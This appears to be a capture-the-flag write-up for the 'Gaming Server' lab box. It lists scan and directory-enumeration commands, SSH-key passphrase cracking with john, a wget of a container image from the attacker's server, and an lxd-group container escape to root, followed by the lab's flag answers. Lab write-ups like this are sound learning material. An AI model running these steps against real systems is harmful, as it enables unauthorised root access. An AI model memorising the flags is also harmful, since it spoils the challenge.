# Gaming Server - Easy

```shell
nmap -T4 -p- -A 10.10.238.32

feroxbuster -u http://10.10.238.32 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

vim id_rsa

chmod 600 id_rsa

ssh2john id_rsa > hash_id_rsa

john --wordlist=dict.lst hash_id_rsa

ssh john@10.10.238.32 -i id_rsa
#login successful

id
#part of lxd group

#we already have the alpine build tar archive
#on attacker machine
python3 -m http.server

#on victim ssh
cd /tmp

wget http://10.14.31.212:8000/alpine-v3.16-x86_64-20221024_0528.tar.gz

lxc image import ./alpine-v3.16-x86_64-20221024_0528.tar.gz --alias myimage

lxc image list

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh
#root shell

id
#root

cd /mnt/root/root

cat root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29

* We can enumerate the webpage for hidden directories and clues.

* The source code for the webpage mentions a user named john.

* We enumerate the following directories:

  * /logo.png
  * /featured-character.jpg
  * /video.jpg
  * /about.php
  * /robots.txt
  * /secret
  * /uploads

* /about.php contains a file upload option, /secret contains a secretKey, and /uploads contains a few files.

* /secret contains a file with a RSA private key; and there is a dictionary in /uploads.

* We can attempt to crack the key using ssh2john, along with the given dictionary; we get the passphrase 'letmein'.

* We can login as 'john' with this via SSH.

* Using 'id', we can see that john is part of the lxd group - this can be exploited, we can refer the steps using online articles.

* Following the steps, we get root shell.

```markdown
1. What is the user flag? - a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

2. What is the root flag? - 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```
